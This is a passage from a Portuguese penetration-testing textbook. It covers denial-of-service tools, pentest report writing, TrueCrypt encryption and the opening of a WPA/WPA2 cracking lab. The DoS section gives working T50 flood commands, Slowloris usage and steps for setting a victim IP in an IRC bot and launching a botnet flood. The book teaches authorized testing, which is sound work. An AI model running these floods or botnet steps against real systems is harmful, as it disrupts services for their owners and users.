tapa\t1\t–\tenvio\tdo\tpacote\tSYN).\tA\tvítima\ttentará\nresponder\tpara\tcada\tendereço\tque\tsolicitou\tuma\tconexão\t(etapa\t2\t–\tSYN+ACK).\nComo\tcada\tIP\tfalso\tnunca\tfez\to\tpedido\tde\tconexão\tpara\ta\tvítima,\tesses\tIPs\tnão\nvão\tresponder\tà\tvítima\te\testa\tficará\tesperando\to\tpacote\tACK\t(etapa\t3\t–\ttérmino\ndo\t\n3-way\t\nhandshake\n\t\ncom\tACK).\tEnquanto\to\tataque\té\tsustentado\tpelo\tatacante,\ta\nvítima\tfica\tsobrecarregada\te\timpossibilitada\tde\tresponder\ta\trequisições\nlegítimas.\nA\tfigura\t15.1\tmostra\tum\tataque\tde\tSYN\tFlood.\nFigura\t15.1\t–\tRepresentação\tvisual\tdo\tSYN\tFlood.\n15.1.1\tT50\nT50\té\tuma\texcelente\tferramenta\tpara\tDoS\tdesenvolvida\tpelo\tbrasileiro\tNelson\nBrito.\tUtiliza-se\tde\tdiversos\tprotocolos\tpara\tnegação\tde\tserviço.\nPara\trealizar\tum\tataque\tde\tSYN\tFlood\tcontra\tum\tdeterminado\tIP\te\tuma\ndeterminada\tporta\tde\tdestino:\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-S\t--dport\t80\nAlém\tda\tflag\tSYN,\ttambém\té\tpossível\tescolher\toutras\tflags,\tcomo\tACK,\tFIN,\nRST\tetc.\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-A\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-F\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-R\nSe\tdesejarmos\tselecionar\tuma\tporta\tde\torigem:\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-S\t--dport\t80\t--sport\t666\nPor\tpadrão\tsão\tenviados\tendereços\tIPs\taleatórios.\tCaso\tdeseje,\tpoderá\tescolher\num\tIP\tde\torigem:\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t-S\t--dport\t80\t--sport\t666\t-s\t1.2.3.4Dessa\tforma,\ta\tinterface\tweb\tdo\troteador\tficará\tinacessível\tenquanto\tdurar\to\nataque.\nAlém\tdo\tataque\tde\tSYN\tFlood\t(envia\tum\texcesso\tde\trequisições\tSYN),\to\tT50\npossibilita\ta\tutilização\tde\toutros\tprotocolos,\tcomo\to\tICMP.\tPara\tenviar\tum\nexcesso\tde\tICMP\tEcho\tRequest:\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t--protocol\tICMP\t--icmp-type\t8\nDe\tforma\tanáloga\tao\tTCP,\tpara\tenviar\tum\texcesso\tde\trequisições\tUDP:\nroot@kali#\n\tt50\t192.168.1.1\t--flood\t--turbo\t--protocol\tUDP\t--dport\t53\nAlém\tdesses\tprotocolos\tmais\tbásicos\t(como\to\tTCP,\tUDP\te\tICMP),\to\tT50\topera\nsobre\toutros\tprotocolos,\tcomo\to\tRIP,\tOSPF\tetc.\tUma\topção\tmuito\tinteressante\té\no\tprotocolo\tproprietário\tchamado\tde\tprotocolo\tT50,\tum\tprotocolo\tcom\tsuporte\ta\ntodos\tos\tprotocolos\tdo\tprograma.\tAo\tutilizá-lo,\tsão\tenviados\ttodos\tos\tprotocolos\ndo\tT50\tcontra\to\talvo.\nroot@kali#\n\tt50\t--flood\t--turbo\t\n--protocol\tT50\n\t192.168.1.1\n\t\nDica:\n\tjá\tpensou\tqual\to\testrago\tque\tum\tataque\tdo\tT50\tfaz\tem\tuma\trede\tempresarial\tse\tfor\tutilizado\ncontra\tum\tfirewall\tou\troteador?\n\t\n15.2\tSlowloris\nO\tSlowloris\té\tuma\tferramenta\tpara\tnegação\tde\tserviço\tque\tatinge\tservidores\nApache\tcom\tversões\tinferiores\tà\t2.2.22.\tEssas\tversões\tsofrem\tuma\nvulnerabilidade\tque\tpermite\tao\tatacante\tsobrecarregar\tum\tservidor\tutilizando-se\nde\tpouca\tbanda.\tA\tvulnerabilidade\tconsiste\tno\tfato\tde\tque\to\tApache\tnão\tlida\nbem\tcom\tvários\tsocks\tlegítimos\tque\tsão\tabertos\te\tnão\tsão\tfinalizados.\tDessa\nforma,\tenquanto\to\tSlowloris\tmantém\tos\tsocks\tabertos,\to\tservidor\tApache\tfica\nsobrecarregado.\tO\tSlowloris\tpode\tser\tencontrado\tem\nhttps://dl.packetstormsecurity.net/DoS/slowloris.pl.txt\n.\nO\tleitor\tdeve\tinstalar\to\tApache\tv2.2.14\tno\tDebian\tcom\ta\tfinalidade\tde\ttestes.\tO\nApache\t2.2.14\tpode\tser\tobtido\tem\t\nhttps://archive.apache.org/dist/httpd/\n.\nFinalize\to\tservidor\tApache\tno\tDebian:\nroot@debian#\n\tservice\tapache2\tstop\nFaça\ta\tinstalação\tdo\tApache\t2.2.14:root@debian:~/httpd-2.2.14#\n\t./configure\nroot@debian:~/httpd-2.2.14#\t\nmake\nroot@debian:~/httpd-2.2.14#\t\nmake\tinstall\nroot@debian:~/httpd-2.2.14#\t\n./httpd\nA\tutilização\tdo\tSlowloris\té\textremamente\tsimples.\tÉ\tnecessário\tapenas\nselecionar\ta\topção\t\n-dns\n\tcom\to\tDNS\tou\tIP\tdo\tsite\tem\tque\tse\tqueira\tatacar:\nroot@kali#\n\tperl\tslowloris.pl\t–dns\tsite.com.br\n15.3\tDDoS\t(Distributed\tDenial\tOf\tService)\nO\tataque\trealizado\tcom\to\tT50\té\tum\ttípico\texemplo\tde\tum\tataque\tde\tDoS,\tno\nqual\tuma\tmáquina\tenvia\tum\texcesso\tde\tpacotes\tpara\ta\tvítima,\te,\tdependendo\tdo\nalvo,\tesse\tataque\tpode\tser\tpouco\tefetivo.\tIsso\tporque\ta\tbanda\tda\tvítima\nconsegue\tprocessar\to\tataque\tde\tDoS\tdo\tatacante\t(conseguindo\tresponder\tàs\nrequisições\tfalsas),\te\to\tataque\tvai\tfalhar.\nUm\tataque\tde\tNegação\tde\tserviço\tdistribuído\t(DDoS\t–\tDistributed\tDenial\tof\nService)\tnada\tmais\té\tdo\tque\tvárias\tmáquinas\tatacando\to\talvo,\ttodas\trealizando\num\tataque\tde\tDoS,\tnormalmente\tpelo\tSYN\tFlood,\tao\tmesmo\ttempo,\tpara\naumentar\to\tdesempenho.\nHá\tinúmeras\tformas\tde\tse\trealizar\tataques\tde\tDDoS.\tUma\tdas\tformas\tmais\nsimples\te\tconvencionais\té\tutilizando\tservidores\tIRC.\nPrimeiro,\to\tatacante\tinfecta\tde\talguma\tforma\t(exploit,\tvírus\tetc.)\tas\tmáquinas\nque\tvão\tparticipar\tdo\tataque\tDDoS.\tEssas\tmáquinas\tsão\tchamadas\tde\tZombie\tou\nBots,\tpois\tagem\tcomo\tum\tzumbi\tesperando\tpor\tordens\t(comandos),\te\tas\tredes\nde\tmáquinas\tinfectadas\t(Bots)\tsão\tchamadas\tde\tredes\tBotnets.\nO\tatacante\tfará\tcom\tque\tas\tmáquinas\tzumbis\tconectem-se\tem\tredes\tIRC\n(mestre)\tpara\tiniciar\to\tataque.\tUm\tmestre\tfica\tno\tcontrole\tde\tinúmeros\tzumbis\te\nserá\tele\tquem\tdará\tas\tordens\taos\tzumbis.\nUma\tvez\tque\tos\tzumbis\tconectaram-se\tàs\tredes\tmestres\t(IRC),\to\tatacante\tenvia\num\tparâmetro\tpara\tiniciar\to\tataque\tde\tDoS.\tAs\tmáquinas\tzumbis\trecebem\tesse\nparâmetro,\tinterpretam-no\te\tiniciam\to\tataque\tde\tDoS\tcontra\to\talvo\tespecífico.\nA\tqualquer\tmomento\to\tatacante\tenvia\tum\tsinal\tao\tmestre\tque\to\trepassa\taos\nzumbis,\tindicando\to\ttérmino\tdo\tataque.\nUma\trede\tbotnet\té\tmostrada\tna\tfigura\t15.2.Figura\t15.2\t–\tRede\tbotnet\tpara\tataques\tDDoS.\nFonte:\thttp://www.ids-sax2.com/articles/PreventDosAttacks.htm.\n15.4\tProjeto\tPerl-Bot\nEsta\tseção\té\tcreditada\tao\tIgor\tde\tLorenzi\tAndrade,\tque\tfez\to\tprojeto\tda\tBot\tpara\nmim\t(Obrigado,\tIgor\t;-)\t)\nO\tPerl-Bot\té\tum\tprojeto\tde\tuma\tbot\tque\troda\tem\tqualquer\tcomputador\tque\ttenha\no\tPerl\tinstalado.\tNesse\tprojeto\tforam\ttestados\tos\tsistemas\toperacionais\tWindows\ne\tLinux.\tApresenta\tcódigo-fonte\taberto\t(licença\tGNU\tGPL)\t\npara\testudo,\nmodificações\te\tadaptações,\te\testá\tdisponível\tem\nhttp://github.com/danielhnmoreno/perl-bot\n.\nO\tprojeto\tPerl-Bot\ttem\ta\tfinalidade\tde\testudo\tdo\tfuncionamento\tde\tuma\tIRC\nBotnet.\n•\tAjuste\to\tcódigo\tda\tPerl-Bot\tpara\tconectar-se\tà\tsala\tmIRC\tpreferencial.\n(Master)\n•\tAjuste\tno\tcódigo\tquem\tserá\ta\tvítima\te\ta\tsua\tporta.\tPor\tpadrão\testá\nconfigurado\tcomo\tsendo\to\tIP\t192.168.1.1\te\ta\tporta\t80.\n•\tExecute\to\tcódigo\tda\tbot\tem\tum\tsistema\tWindows\t(necessário\tActive-Perl)\tou\nLinux.\t(Zombie)\n•\tPara\tiniciar\to\tataque,\tdigite\tno\tcliente\tde\tIRC\t(mIRC)\n!udp\n•\tPara\tfinalizar\to\tataque,\tdigite\tno\tcliente\tde\tIRC(mIRC)\t\n!stopA\tfigura\t15.3\tmostra\ta\trede\tbotnet\trealizando\tum\tataque\tde\tDDoS.\nFigura\t15.3\t–\tBotnet\tem\tataque.CAPÍTULO\n\t16\nDocumentação\ttécnica\nUma\tvez\trealizado\to\tteste\tde\tintrusão,\tdeverá\tser\tentregue\tao\tcliente\ta\ndocumentação\tdas\tvulnerabilidades\tencontradas\tdurante\tesse\tteste.\tTambém\té\tde\nextrema\timportância\trelatar\te\texplicar\tcomo\tadotar\tmedidas\tpreventivas\tpara\nque\tum\tatacante\tnão\tconsiga\tacesso\tà\trede.\nFornecer\tum\trelatório\ttécnico\tao\tcliente\té\timportante\tdo\tponto\tde\tvista\tético\te\njudicial,\tconsiderando\tque\ttodas\tas\tvulnerabilidades\ttestadas\te\tencontradas\tserão\nexpostas\tna\tdocumentação\ttécnica.\nLembre-se\tde\tque\ttoda\ta\tdocumentação\té\tnecessária,\tpois\tum\tpequeno\terro\n(como\tfalta\tde\tdocumentação)\tvindo\tda\tparte\tdo\tauditor\tpoderá\tter\nconsequências\tjurídicas.\nSerá\tnecessário\tassinar\tum\tcontrato\tde\tlei\tem\tque\to\tcliente\tautoriza\to\tteste\tde\nintrusão\tem\tsuas\tmáquinas,\tuma\tvez\tque\ta\tinvasão\tde\tmáquinas\tconfigura\tem\ncrime\tregido\tpela\tlegislação\tbrasileira\tcom\tdetenção\tda\tpessoa\tque\trealizou\to\nato.\nNo\tcontrato\tdeve\tser\tespecificado\texatamente\ttudo\to\tque\to\tauditor\tfará,\tpara\tque\nambos,\to\tauditor\te\to\tcliente,\tnão\ttenham\tproblemas\tcom\ta\tlegislação\tbrasileira.\n16.1\tTipos\tde\trelatórios\nDepois\tde\tanalisada\tcada\tetapa\te\tenumerada\tcada\tvulnerabilidade,\tserá\tmontado\no\trelatório\tfinal\ta\tser\tenviado\tao\tcliente.\nExistem\ttrês\ttipos\tde\trelatórios:\texecutivo,\ttécnico\te\tcomercial\n1\n.\n16.1.1\tRelatório\tExecutivo\nEste\ttipo\tde\trelatório\tdeve\tbasicamente\tconter:\n•\t\nCapa/Índice\t\n–\tUma\tcapa\te\tum\tíndice\tpara\tuma\tmelhor\tapresentação\tfinal\tde\nseu\trelatório.\n•\t\nObjetivo\tdo\tteste\n\t–\tPor\tque\to\tteste\tde\tpenetração\testá\tsendo\trealizado?Quais\tsão\tos\tobjetivos\ta\tserem\talcançados?\tPor\texemplo:\tobtenção\tda\tsenha\ndo\tsite,\tapenas\tum\tteste\tde\trede\tsem\tfio\tcom\tobtenção\tda\tsenha,\tou\tmesmo\ta\ninstalação\tde\tvírus\te\tdisseminação\tde\tspam.\n•\t\nClassificação\tdas\tvulnerabilidades\n\t–\tUma\tseção\tinformando\tos\tníveis\tde\nrisco\tdas\tvulnerabilidades\tencontradas\tpara\tcada\tmáquina.\n•\t\nSumário\texecutivo\n\t–\tDescreve\ta\tmetodologia\tusada\tpara\to\tcenário\tde\npentest,\tquais\tos\ttestes\tque\tserão\trealizados\te\tuma\tpequena\tamostra\tdo\tque\nfoi\tconseguido.\n16.1.2\tRelatório\ttécnico\nO\trelatório\ttécnico\té\to\tprincipal\trelatório\tpara\ta\tdescrição\tde\tvulnerabilidades,\ndetalhando\tminuciosamente\to\tataque,\tquais\tferramentas\tusadas\te\tresultados\nobtidos.\tFazer\tesse\tdetalhamento\té\textremamente\timportante,\tpois\tvocê\tvai\nalertar\to\tcliente\tsobre\tquais\tas\tferramentas\tutilizadas,\tqual\to\tresultado\tdaquela\nferramenta\tetc.\tDeve\tconter:\n•\t\nMapemamento\tdas\tvulnerabilidades\n\t–\tVulnerabilidades\tencontradas\tjunto\ndo\tseu\tgrau\tde\trisco.\tPode\tser\tfeito\tem\tforma\tdescritiva\tou\tem\tforma\tde\ngráficos\t(opcional,\tpois\to\tdetalhamento\tdas\tvulnerabilidades\tdeve\tser\tfeito\tna\ndescrição\tdo\tataque).\n•\t\nMapeamento\tdos\texploits\n\t–\tLista\tdos\texploits\tutilizados\tcom\tsucesso\n(opcional,\tpois\to\tdetalhamento\tdos\texploits\tdeve\tser\tfeito\tna\tdescrição\tdo\nataque).\n•\t\nNarrativa\tdo\tataque\t\n–\tFundamentalmente\té\to\trelatório\ttécnico.\tNa\ndescrição\tdo\tataque,\tdeve-se\tdescrever\tdetalhamente\tuma\tnarrativa/história\npara\tcada\terro\tencontrado.\tPrimordialmente,\tas\tferramentas\tutilizadas\te\to\nnível\tde\timpacto\tdessas\tvulnerabilidades\tdevem\tser\tdescritos.\tA\tdescrição\ndas\tvulnerabilidades\tencontradas\tnão\té\tuma\taula\tde\tpentest\tao\tcliente,\tnão\té\nnecessário\tdar\tum\t“how\tto”\tou\tensiná-lo\ta\tusar\ta\tferramenta,\tno\tque\tmuito\nprovavelmente\tele\tnem\testeja\tinteressado,\tpois,\tse\ttivesse,\tele\tmesmo\tfaria\to\npentest,\te\tnão\to\tcontrataria.\tMas\tdescrever\tde\tmaneira\tbem\tsucinta\to\t“modus\noperante”\tda\tferramenta\té\tcrucial\tpara\talertar\to\tcliente\tde\tcomo\tela\tfunciona.\n•\t\nPráticas\tde\tsegurança\t(hardening)\t\n–\tDeve\tconter\tmedidas\tpara\tassegurar\nos\tpilares\tda\tsegurança\tda\tinformação\te\tproteção\tdigital\tdos\tdados.16.1.3\tRelatório\tcomercial\nO\trelatório\tcomercial\tfundamentalmente\tdeverá\trelacionar\tas\tmáquinas\tque\nforam\ttestadas\te\tqual\to\tvalor\tde\tcada\tativo\te/ou\to\tvalor\ttotal\tdo\tprojeto\tde\npentest.\n16.2\tCriptografando\trelatórios\tcom\to\tTruecrypt\nTrueCrypt\té\tuma\tferramenta\tque\tauxilia\tna\tcriptografia\tdos\tdados\te\tjá\tvem\ninstalada\tno\tKali\tLinux.\tDados\tsigilosos\tcomo\trelatório\tde\tteste\tde\tintrusão\ndevem\tser\tcriptografados\tcom\to\tTrueCrypt,\tpois\tmesmo\tque\tse\tperca\to\tHD\tou\to\npendrive,\tos\tdados\tserão\tilegíveis.\n16.2.1\tCriando\tum\tarquivo\tcriptografado\n1.\n\tCrie\tum\tvolume\tnovo\tno\tbotão\t\nCreate\tVolume\n\t(Figura\t16.1).\nFigura\t16.1\t–\tCrie\tum\tnovo\tvolume.\n2.\n\tPara\tse\tcriar\tum\tarquivo\tcriptografado\tescolha\ta\topção\t\nCreate\tan\tencrypted\nvolume\n.\nPara\tcriar\tum\tpendrive\tcriptografado,\tescolha\ta\topção\t\nCreate\ta\tvolume\twith\npartition/drive\n\te,\tna\tpróxima\ttela,\tescolha\to\tvolume\tdo\tpendrive\t(Figura\n16.2).Figura\t16.2\t–\tCrie\tuma\tpasta\tcriptografada\tpela\tprimeira\topção\tou\tum\npendrive\tcriptografado\tna\tsegunda\topção.\n3.\n\tEscolha\ta\topção\t\nStandard\tTrueCrypt\tvolume\n,\tpara\tapenas\tcriar\tum\tvolume\ncriptografado.\nO\tTrueCrypt\ttambém\tpossibilita\ta\tcriação\tde\tum\tvolume\tcriptografado\te\nescondido\tcom\ta\topção\t\nHidden\tTrueCrypt\tvolume\n,\tconforme\tmostra\ta\tfigura\n16.3.\nFigura\t16.3\t–\tCrie\tum\tvolume\tnormal.\n4.\n\tEscolha\to\tlugar\tem\tque\tserá\tsalvo\to\tnosso\tvolume\tcriptografado.\tNo\nexemplo\tserá\tcriado\tum\tarquivo\tde\tnome\t“\ncriptografado\n”\tem\t\n/root/Desktop/,\nconforme\tmostra\ta\tfigura\t16.4.Figura\t16.4\t–\tLocalização\tdo\tarquivo\tcriptografado\tque\tserá\tsalvo.\n5.\n\tEscolha\to\ttipo\tde\tcriptografia\ta\tse\tusada\tno\tTrueCrypt.\tParticularmente\ngosto\tda\tcriptografia\tAES.\tA\tfigura\t16.5\tilustra\to\tprocesso.\nFigura\t16.5\t–\tAlgoritmo\tcriptográfico\ta\tser\tutilizado.\n6.\n\tEscolha\to\ttamanho\tmáximo\tdo\tvolume.\tNa\tfigura\t16.6,\tarquivos\tacima\tde\n1MB\tnão\tserão\tcopiados\tpara\to\tnosso\tvolume\tcriptografado.\n7.\n\tDefina\ta\tsenha.\tNesse\tmomento,\ta\tescolha\tde\tuma\tsenha\tdifícil\té\tcrucial,\npois\tserá\tela\tque\tvai\tcriptografar\te\tdescriptografar\to\tnosso\tvolume.\tNa\tfigura\n16.7\tfoi\tutilizada\ta\tsenha\t“senha”\tapenas\tpara\ttestes.Figura\t16.6\t–\tTamanho\tdo\tslot\tcriptografado.\nFigura\t16.7\t–\tDefina\tuma\tsenha\tforte,\tcom\tletras,\tnúmeros,\tdígitos\te\tcaracteres.\nSenhas\tfracas\tsão\tfacilmente\tdecifráveis.\nAo\tser\tselecionada\tuma\tsenha\tsimples,\to\tpróprio\tTrueCrypt\texibe\tuma\talerta\nsobre\to\tperigo\tde\tsenhas\tsimples.\tComo\testamos\trealizando\tum\tteste,\ncontinue\tcom\ta\texecução\tdo\tsoftware\tsem\tmaiores\tproblemas,\tescolhendo\to\nbotão\t\nYes\n\t(Figura\t16.8).\n8.\n\tEscolha\to\ttipo\tde\tvolume\tque\tserá\tcriado.\t\nFAT\n\tindica\tque\to\tarquivo\tpoderá\nser\tlido\tem\tsistemas\tWindows\t(além\tdo\tLinux).\tSistemas\t\next2\n,\t\next3\n,\t\next4\nsomente\tpodem\tser\tlidos\tpelo\tLinux.\tPor\tpraticidade,\tescolherei\to\ttipo\t\nFAT\n,\nlevando\tem\tconsideração\tque\ta\tmáquina\tque\tvai\treceber\tos\tdados\té\tuma\nmáquina\tWindows\t(Figura\t16.9).\nFigura\t16.8\t–\tContinue\tcom\ta\texecução\tdo\tTrueCrypt.Figura\t16.8\t–\tContinue\tcom\ta\texecução\tdo\tTrueCrypt.\nFigura\t16.9\t–\tTipo\tde\tsistema\tde\tarquivo\tque\tserá\tcriado\tno\tslot\tcriptografado.\n9.\n\tO\tvolume\ta\tser\tcriado\tdeve\tser\tformatado.\tDe\tacordo\tcom\to\tpróprio\nTrueCrypt\tessa\tetapa\té\textremamente\timportante,\tpois\té\to\tque\tvai\tdefinir\ta\nforça\tda\tsua\tsenha.\tSeguindo\ta\torientação\tdo\tprograma:\t“Mova\to\tseu\tmouse\no\tmais\trandomicamente\tpossível,\tdentro\tdesta\tjanela.\tQuanto\tmais\tmovê-lo,\nmelhor.\tIsso\taumenta\tsignificativamente\ta\tforça\tcriptográfica\tdas\tchaves\tde\nencriptação.\tEntão,\tclique\tem\t\nFormat\n\tpara\tcriar\to\tvolume”\t(Figura\t16.10).\n10.\n\tO\tvolume\tfoi\tcorretamente\tcriado.\tSaia\tdessa\ttela\tpressionando\to\tbotão\nExit\n\t(Figura\t16.11).\nFigura\t16.10\t–\tMova\trandomicamente\to\tmouse\tpara\taumentar\ta\tsegurança\ncriptográfica.Figura\t16.11\t–\tO\tvolume\tfoi\tcorretamente\tcriado.\n11.\n\tVoltando\tà\ttela\tprincipal,\tselecione\tum\tslot\tvazio.\nNa\tfigura\t16.12\thá\t12\tslots\tque\tnão\testão\tsendo\tutilizados.\tFoi\tselecionado\to\nprimeiro\tslot.\nSelecione\to\tarquivo\tem\t\nSelect\tFile\n.\tNo\texemplo,\to\tarquivo\té\n/root/Desktop/criptografado\n.\nSelecione\ta\topção\tde\t\nMount\n\tpara\tmontar\te\tvisualizar\to\tvolume\tcriptografado.\nFigura\t16.12\t–\tO\tarquivo\tcriptografado\tfoi\tcriado\tcom\tsucesso.\tPara\t“ler”\to\nseu\tconteúdo\té\tnecessário\tmontá-lo.\n12.\n\tDigite\ta\tsenha\tdefinida\tpela\tetapa\t7\t(Figura\t16.13).Figura\t16.13\t–\tDigite\ta\tsenha\tdo\tvolume\tcriptografado.\n13.\n\tCom\to\tvolume\tmontado,\té\tpossível\tvisualizar\to\tseu\tconteúdo\te\tarrastar\to\nnosso\trelatório\tde\tpentest\tpara\tdentro\tdo\tvolume\t“truecrypt1”\t(volume\n/root/Desktop/criptografado\n),\tconforme\tmostra\ta\tfigura\t16.14.\nFigura\t16.14\t–\tO\trelatório\tde\tpentest\tpode\tser\tinserido\tdentro\tdo\tvolume\ncriptografado.\n14.\n\tQuando\to\tarquivo\tfor\tdesmontado\t(opção\t\nDismount\n),\to\tconteúdo\tdo\nvolume\t\n/root/Desktop/criptografado\n\tserá\ttotalmente\tcriptografado\te\nhumanamente\tilegível,\tconforme\tmostra\ta\tfigura\t16.15.\nFigura\t16.15\t–\tDesmonte\tsempre\to\tslot\tpara\tque\teste\tnão\tfique\tlegível.Figura\t16.15\t–\tDesmonte\tsempre\to\tslot\tpara\tque\teste\tnão\tfique\tlegível.\nPara\tque\tseja\tpossível\tvisualizar\tnovamente\to\tconteúdo\tdentro\tde\n/root/Desktop/criptografado\n,\tas\tetapas11,\t12,13\te\t14\tdevem\tser\trepetidas.\n16.2.2\tCriando\tum\tpendrive\tcriptografado\nPara\tcriar\tum\tpendrive\tcriptografado\tserá\tnecessário\tum\tpendrive\tsem\tnenhum\ntipo\tde\tdado,\tisso\tporque,\tdurante\ta\tcriação\tdo\tpendrive\tcriptografado,\to\nTruecrypt\tformata\to\tpendrive\tcom\to\tsistema\tde\tcriptografia\tescolhido.\n1.\n\tCrie\tum\tvolume\tnovo,\tconforme\tmostra\ta\tfigura\t16.1.\n2.\n\tPara\tcriar\tum\tpendrive\tcriptografado,\tescolha\ta\topção\t\nCreate\ta\tvolume\twith\npartition/drive\n.\n3.\n\tDa\tmesma\tforma\tque\tarquivos,\tpendrives\tcriptografados\tpodem\tser\tcriados\nde\tforma\tconvencional\tou\tescondida,\tselecione\ta\topção\t\nStandard\tTrueCrypt\nvolume\n\t(Figura\t16.16).\nFigura\t16.16\t–\tSelecione\ta\topção\tStandard\tTrueCrypt\tvolume.\nSelecione\to\tdispositivo\tpendrive\ta\tser\tcriptografado\tpela\topção\t\nSelect\tDevice\n,\nconforme\tmostra\ta\tfigura\t16.17.\tCertifique-se\tde\tque\tesse\tdispositivo\trealmente\né\to\tseu\tpendrive.\tLembrando\tque\ttodos\tos\tdispositivos\tserão\tmostrados\tnessa\ntela.\tEntão,\tse\tfor\tescolhido\to\tHD,\ttodo\to\tHD\tserá\tformatado,\te\tseus\tdados\tserão\nperdidos.\tHá\tvários\tcomandos\tque\tpossibilitam\to\tusuário\tchecar\to\tpendrive,\ncomo\to\t\nfdisk\n,\t\nblkid\n,\t\nlsblk\n\tetc.\tNormalmente,\to\tpendrive\té\tmontado\tcomo\tsendo\no\tdispositivo\t\n/dev/sdb1\n.\tVerifique\tcom\to\tcomando\t\nlsblk\n\t(o\tdispositivo\tpendrive\né\tmontado\tem\t\n/media\n).\nroot@kali#\n\tlsblk\t-fFigura\t16.17\t–\tSelecione\to\tpendrive\ta\tser\tcriptografado.\nO\trestante\tdo\tprocedimento\té\tidêntico\tà\tcriação\tde\tum\tarquivo\tcriptografado.\nPara\tmontar\tum\tpendrive\tcriptografado,\tclique\tem\t\nSelect\tDevice\n\te\tdepois\tno\nbotão\t\nMount\n,\tconforme\tmostra\ta\tfigura\t16.18.\nFigura\t16.18\t–\tSelecione\to\tpendrive\ta\tser\tmontado.\n1\n\tOs\ttrês\tmodelos\tforam\tpropostos\tpor\tShakeel\tAli\te\tTedi\tHeriyanto,\tautores\tdo\tlivro\t\nBacktrack\t4:\nAssuring\tSecurity\tby\tPenetration\tTesting\n.\t(p.\t323\te\t325.)\tA\tescrita\tde\tum\trelatório\tnão\tsegue\tum\tpasso\ta\npasso\trigoroso,\tmas\tdeve\tfundamentalmente\talertar\to\tseu\tcliente\tsobre\tas\tfalhas\tencontradas\te\tproteger\to\nseu\tcliente\tde\tataques\tdigitais.CAPÍTULO\n\t17\nPentest\tem\tredes\tsem\tfio\nPara\tcomplementarmos\to\testudo\tsobre\tpentest\tem\tredes\tde\tcomputadores,\tserá\nrealizado\tum\tlaboratório\tsobre\tpentest\tem\tredes\tsem\tfio,\tlembrando\tque\tesse\nlaboratório\tnão\tcobre\ttodos\tos\taspectos\tde\tum\t\nwireless\n\tpentest.\tUm\testudo\tmais\ndetalhado\tsobre\tredes\tsem\tfio\tdeve\tser\tabordado\tcomo\tum\ttema\tà\tparte.\nA\tprincipal\tcriptografia\tque\tserá\testudada\té\ta\tcriptografia\tWPA/WPA2\tPersonal.\nO\tWPA\t(Wi-Fi\tProtected\tAccess\t–\tAcesso\tProtegido\ta\tWi-Fi)\tpermite\ta\nautenticação\tcom\tbase\tem\tEAP\t(usando\to\tRadius)\tou\tPSK\t(Pre-shared\tKey).\nUma\tautenticação\tWPA/WPA2\tPSK\tocorre\tpor\tmeio\tdo\t\n4-way\thandshake\n,\nmostrado\tna\tfigura\t17.1.\nFigura\t17.1\t–\tProcesso\t4-way\thandshake.\nFonte:\thttp://en.wikipedia.org/wiki/IEEE_802.11i-2004.\n1.\n\tO\troteador\t(AP)\tenvia\tum\tvalor\tnonce\t(ANONCE)\tpara\to\tcliente\twireless\n(STA).\n2.\n\tCom\to\tconhecimento\tdo\tANONCE\tdo\troteador\te\tjá\tsabendo\to\tPMK\t(chave\nmestra),\to\tcliente\tconsegue\tconstruir\to\tPTK\t(chave\ttemporária)\te\tgerar\to\nMIC.\tApós\tesse\tprocesso,\to\tcliente\twireless\tenvia\tseu\tpróprio\tvalor\tnonce\n(SNonce)\tcom\to\tnúmero\tMIC\t(Message\tIntegrity\tCheck),\tum\tpacote\tde\nintegridade\tgerado.\n3.\n\tCom\to\tSNONCE\t+MIC\tdo\tcliente,\to\troteador\tcria\tum\tnovo\tPTK\ta\tpartir\ndessas\tinformações,\te\té\tgerado\tum\tMIC,\tque\tserá\tcomparado\tcom\to\tMICcorreto.\tCaso\to\tMIC\tgerado\tseja\to\tmesmo\tque\to\tMIC\tcorreto,\tsignifica\tque\to\nPMK\té\tcorreto\te\to\tcliente\tpode\tconectar-se\tà\trede.\tSe\ttudo\testiver\tOK,\to\nroteador\tenvia\to\tGTK+MIC,\tque\té\tusado\tpara\tdescriptografar\ttráfego\nmulticast/broadcast.\n4.\n\tO\tcliente\tenvia\tuma\tconfirmação\tpara\to\troteador\t(Acknowledgement).\nO\tproblema\tde\tsegurança\treferente\tao\t\n4-way\thandshake\n\testá\trelacionado\tcom\to\nfato\tde\tque\to\tprocesso\tde\tderivação\tde\tchaves\tpode\tser\treproduzido.\tOu\tseja,\nredes\tWPA/WPA2\tPSK\tpodem\tser\talvos\tde\tataque\tde\tdicionário\tde\tpalavras.\nAntes\tde\tiniciar\tcada\tlaboratório,\tinicie\to\tseu\tcomputador\tpor\tmeio\tde\tum\nLiveCD\tdo\tKali\tLinux,\tisso\tporque\tlimitações\tna\tmáquina\tvirtual\tnão\tpermitem\nexperimentos\tcom\tredes\tsem\tfio.\nFinalize\tos\tseguintes\tprocessos\tno\tLive\tCD\tdo\tKali\tLinux:\nroo@kali#\n\tkillall\tNetworkManager\nroo@kali#\n\tkillall\twpa_supplicant\nroo@kali#\n\tkillall\tdhclient\nroo@kali#\n\tifconfig\twlan0\tdown\nPara\trealizar\ta\tquebra\tdo\tWPA/WPA2\tPSK,\tprimeiro\tconfigure\to\troteador\tpara\na\tcriptografia\tWPA/WPA2\tPSK,\tconforme\tmostra\ta\tfigura\t17.2.\nFigura\t17.2\t–\tConfigure\to\troteador\tpara\to\tsistema\tde\tcriptografia\tWPA2\nPersonal.\nInicie\to\tprograma\tAirmon-ng\tpara\tcriar\tuma\tinterface\tvirtual\t(\nmon0\n)\tque\tserá\nusada\tpara\tos\ttestes\tde\tintrusão\tem\tredes\tsem\tfio:\nroot@kali#\n\tairmong-ng\tstart\twlan0Digite\t\nifconfig\n\tno\tterminal\tpara\tconfirmar\tque\ta\tinterface\tem\tmodo\tmonitor\nmon0\n\tfoi\tcriada\tcom\tsucesso:\nroot@kali#\n\tifconfig\nInicie\ta\tcaptura\tcom\to\tprograma\tAirodump-ng\tpara\tvisualizar\tas\tredes\tsem\tfio\nno\talcance\tda\tplaca\twireless:\nroot@kali#\n\tairodump-ng\tmon0\nCH\t11\t][\tElapsed:\t0\ts\t][\t2015-03-28\t00:52\t[\tWPA\thandshake:\t74:EA:3A:E1:E8:66\t]\n\t\nBSSID\tPWR\tBeacons\t#Data,\t#/s\tCH\tMB\tENC\tCIPH